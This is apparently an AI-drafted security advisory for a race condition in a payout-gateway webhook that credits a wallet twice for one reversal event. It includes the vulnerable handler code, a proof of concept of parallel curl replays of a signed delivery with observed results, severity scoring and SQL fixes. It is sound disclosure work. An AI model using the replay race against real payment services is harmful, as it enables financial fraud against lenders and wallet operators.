# v2 · + Context and Motivation (raw output)

> Larger Claude model, fresh subagent, 2026-11-06. Verbatim; nothing edited.

---

# Security Advisory: Race Condition in Wallet Payout-Status Webhook Allows Duplicate Wallet Credits

| Field | Value |
|---|---|
| **Advisory ID** | Not yet assigned (GHSA / CVE to be requested by the maintainers) |
| **Package** | `payout-gateway` |
| **Affected version (confirmed)** | `2.3.1` (commit `4be81c2`) |
| **Other versions** | Not tested. Unknown. |
| **Patched version** | None yet |
| **Component** | `POST /webhooks/wallet/payout-status` (`src/webhooks/payoutStatus.ts`, `handlePayoutStatus`, lines 52–64) |
| **Weakness** | CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition. Related: CWE-362. Contributing: CWE-294 (Authentication Bypass by Capture-replay) |
| **Proposed severity** | High. CVSS v3.1 7.5 `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` (see the rationale under Severity) |
| **Environment tested** | Internal staging deployment, with a validly signed delivery from the wallet provider's sandbox |
| **Date of testing** | 2026-11-03 |

---

## 1. Summary

The payout-status webhook handler deduplicates events with a check-then-act sequence that is not atomic. It checks whether an `event_id` was already processed, credits the borrower's wallet, and only then records the `event_id` as processed. The wallet credit is an awaited call to the wallet service that took about 180 ms in testing. If two or more requests carrying the same validly signed `payout.reversed` delivery arrive at the same time, every one of them passes the duplicate check before any of them records the event. Each one then credits the wallet.

In staging, sending one ₱5,000.00 reversal delivery twice in parallel credited the wallet twice (₱10,000.00 in total) and wrote two ledger rows with the same event reference. This reproduced in 20 of 20 attempts.

---

## 2. Details

### 2.1 Vulnerable code

`src/webhooks/payoutStatus.ts`, lines 52–64, at commit `4be81c2`:

```ts
export async function handlePayoutStatus(req: Request, res: Response) {
  const sig = req.header('X-Wallet-Signature')
  if (!verifyHmac(req.rawBody, sig, process.env.WALLET_WEBHOOK_SECRET)) return res.status(401).end()
  const evt = JSON.parse(req.rawBody.toString())
  if (await db.processedEvents.exists(evt.event_id)) {          // (1) CHECK
    return res.status(200).json({ status: 'duplicate_ignored' })
  }
  if (evt.type === 'payout.reversed') {
    await wallet.credit(evt.data.borrower_id, evt.data.amount_centavos, { ref: evt.event_id })  // (2) ACT (~180 ms)
  }
  await db.processedEvents.insert(evt.event_id)                 // (3) RECORD
  return res.status(200).json({ status: 'ok' })
}
```

### 2.2 Root cause

1. **Non-atomic deduplication.** The steps run in the order check (1), side effect (2), record (3). Concurrent requests that reach (1) before any of them reaches (3) all see "not processed" and all run (2). The ~180 ms awaited call in (2) leaves a wide window, so no special timing was needed.
2. **No uniqueness constraint.** `processed_events.event_id` has no unique constraint (confirmed by inspecting the table definition). The database therefore cannot reject the second insert, and duplicate rows are stored silently.
3. **No idempotency at the ledger.** The wallet ledger accepted two credit rows with the same `ref` (the `event_id`). Nothing on the credit path rejects a repeated reference.

### 2.3 Contributing weakness: signatures do not expire

The signed payload has no timestamp, and the handler applies no tolerance window. A captured signed delivery stays valid with no time limit. Sequential replays of a processed event are rejected (`duplicate_ignored`), so this weakness does not cause a duplicate credit by itself. It does mean that any signed delivery an attacker obtains can be used for the race at any later time.

### 2.4 How an attacker can obtain a signed delivery

During testing, the wallet provider's sandbox dashboard let any merchant user with the `viewer` role download raw deliveries, including the `X-Wallet-Signature` header. The researcher did not need the webhook signing secret to exploit this issue. The original delivery and its original signature were replayed unchanged.

Whether the production provider dashboard behaves the same way was not tested.

---

## 3. Proof of Concept

All identifiers, hosts and credentials below are placeholders.

**Preconditions:** a deployment of `payout-gateway@2.3.1`, and one validly signed `payout.reversed` delivery (body plus `X-Wallet-Signature` value) for a test borrower.

**Step 1: sequential replay is rejected as expected.**

```bash
curl -sk -X POST https://<GATEWAY_HOST>/webhooks/wallet/payout-status \
  -H "X-Wallet-Signature: $SIG" -H "Content-Type: application/json" \
  --data-binary @delivery.json
# {"status":"ok"}

curl -sk -X POST https://<GATEWAY_HOST>/webhooks/wallet/payout-status \
  -H "X-Wallet-Signature: $SIG" -H "Content-Type: application/json" \
  --data-binary @delivery.json
# {"status":"duplicate_ignored"}
```

**Step 2: reset the test state, then replay the same delivery in parallel.**

```bash
for i in 1 2; do
  curl -sk -X POST https://<GATEWAY_HOST>/webhooks/wallet/payout-status \
    -H "X-Wallet-Signature: $SIG" -H "Content-Type: application/json" \
    --data-binary @delivery.json &
done; wait
# {"status":"ok"}{"status":"ok"}
```

Delivery body used (identifiers redacted):

```json
{"event_id":"<EVENT_ID>","type":"payout.reversed","data":{"borrower_id":"<BORROWER_ID>","amount_centavos":500000}}
```

**Step 3: observed result.**

| Observation | Before parallel replay | After parallel replay |
|---|---|---|
| Wallet `balance_centavos` (admin wallet endpoint) | `0` | `1000000` (₱10,000.00) |
| Expected balance for one ₱5,000.00 reversal | — | `500000` (₱5,000.00) |
| `wallet_ledger` rows with `ref = <EVENT_ID>` | — | 2 rows, each `amount_centavos = 500000` |

**Reproduction rate (as recorded by the researcher):**

| Parallel requests | Result |
|---|---|
| 2 | Double credit in 20 of 20 attempts |
| 5 | 3 credits in one run. 2 credits in the other runs. (The exact number of 5-way runs was not recorded.) |

---

## 4. Impact

- **Financial integrity (demonstrated):** one `payout.reversed` event can credit a borrower wallet more than once. In testing, a ₱5,000.00 reversal produced ₱10,000.00 in credits. The ledger then holds duplicate credit rows that do not match the provider's single event, so reconciliation breaks.
- **Scaling (partially demonstrated):** more parallel requests can produce more than two credits. Three credits from one event were seen once with 5 parallel requests. The upper bound was not established.
- **Who can trigger it (inferred, not tested end to end):** anyone holding a validly signed delivery. In the sandbox this included any provider-dashboard user with the `viewer` role. Signatures do not expire, so old deliveries also work. A provider that retries one delivery concurrently could plausibly trigger this without any attacker, but that was not observed.
- **Not demonstrated:** exploitation in production; draining funds out of a wallet after a duplicate credit; impact on any webhook other than `payout-status`; any confidentiality or availability impact.

---

## 5. Severity Rationale

Proposed: **CVSS v3.1 7.5 (High)**, `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`.

| Metric | Value | Reason |
|---|---|---|
| AV | Network | The webhook is an HTTP endpoint. |
| AC | Low | 20 of 20 success with two plain parallel `curl` calls. No timing tuning was needed. |
| PR | None | The vulnerable endpoint authenticates only the payload signature. It requires no account on `payout-gateway`. |
| UI | None | No user interaction. |
| C / I / A | None / High / None | Direct, repeatable corruption of wallet balances and the financial ledger. |

**Assumption to confirm before publishing:** if the maintainers treat "holds a provider-dashboard `viewer` account" as a required privilege, PR becomes Low and the score is **6.5 (Medium)**, `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N`. The final rating should be agreed with the maintainers.

---

## 6. Remediation

Make deduplication atomic and enforce it at the data layer, not in application logic.

1. **Add a unique constraint on the dedup key.** Remove any existing duplicate rows first.

   ```sql
   ALTER TABLE processed_events
     ADD CONSTRAINT processed_events_event_id_key UNIQUE (event_id);
   ```

2. **Claim the event before the side effect, atomically.** Replace `exists()` followed by a later `insert()` with one conditional insert. Only the request that wins the insert goes on to credit the wallet.

   ```sql
   INSERT INTO processed_events (event_id, status)
   VALUES ($1, 'processing')
   ON CONFLICT (event_id) DO NOTHING
   RETURNING event_id;
   -- 0 rows returned => another request already claimed this event: respond duplicate_ignored
   ```

   The wallet credit is an external call, so it cannot share a database transaction with this insert. Track a status (`processing` → `done`). If the credit fails, return a 5xx so the provider retries, and define how a retry handles an event that is stuck in `processing`.

3. **Make the credit itself idempotent (defense in depth).** Pass `event_id` to the wallet service as an idempotency key. Enforce uniqueness on the ledger reference for reversal credits, for example a unique index on `wallet_ledger (ref)` scoped to that entry type. A duplicate credit should then be rejected even if the handler-level dedup fails.

4. **Bound signature validity.** If the provider supports it, require a signed timestamp and reject deliveries outside a short tolerance window, for example 5 minutes. Confirm that `verifyHmac` uses a constant-time comparison. (This was not reviewed.)

5. **Add a regression test.** Send N concurrent identical signed deliveries (N ≥ 5). Assert exactly one `processed_events` row, exactly one ledger row for the reference, and a balance credited exactly once.

### Workarounds until a patch ships

- Add the unique constraint on `processed_events.event_id` (step 1). Concurrent duplicates will then fail at the insert. **This alone does not stop the duplicate credit,** because the credit happens before the insert. Pair it with step 2 or step 3.
- Reconcile `wallet_ledger` for repeated `ref` values to find any duplicate credits that already happened.

---

## 7. Open Items / Not Verified

| Item | Status |
|---|---|
| `src/webhooks/refundStatus.ts` may use the same check-then-act pattern | **Not checked.** It needs review before the advisory's scope is finalized. |
| Versions other than `2.3.1` / `4be81c2` | Not tested. |
| Production behavior and the production provider dashboard's `viewer` download permission | Not tested. |
| The "reset" step between the sequential and parallel tests | **Needs clarification from the researcher.** The sequential test had already recorded `<EVENT_ID>` as processed. The parallel replay of the same event was still accepted, and only 2 ledger rows exist for that ref afterward. Both facts point to the reset clearing `processed_events` and the ledger rows, not just the wallet balance. Record exactly what the reset did so maintainers can reproduce the test faithfully. |
| Number of 5-way parallel runs | Not recorded. |
| CVE identifier | **None assigned.** Request one through the repository's GHSA flow or a CNA. Do not cite an ID until one is issued. |

---

## 8. Credits and Timeline

- **Discovered by:** [Researcher name, pending confirmation of attribution preference]
- **2026-11-03:** issue identified and reproduced in staging.
- **[TBD]:** reported to maintainers.
- **[TBD]:** fix released.
- **[TBD]:** public disclosure.

---

## Internal Pre-Publication Checklist (remove this section before publishing)

The source notes contained the material below. It has been removed from or replaced in this advisory. **Do not paste the raw notes into any ticket, email or GHSA draft.**

| Removed item | Action needed |
|---|---|
| Bearer token for an internal `payout_admin` service account | Revoke or rotate it. It appeared in plaintext in the notes. |
| Staging `WALLET_WEBHOOK_SECRET` value | **Rotate it.** It appeared in plaintext in the notes. It was not needed for the exploit. |
| Internal hostname, gateway IP/port and database IP | Replaced with `<GATEWAY_HOST>` or omitted. |
| Database username | Omitted. |
| Borrower mobile number (MSISDN) | Omitted. This is personal data. |
| Borrower ID, event ID, ledger row IDs, partial signature value | Replaced with placeholders or omitted. |
| Researcher initials | Replaced with an attribution placeholder. |

Separately, report the sandbox dashboard behavior (a `viewer` role can download signed raw deliveries, including `X-Wallet-Signature`) to the wallet provider.
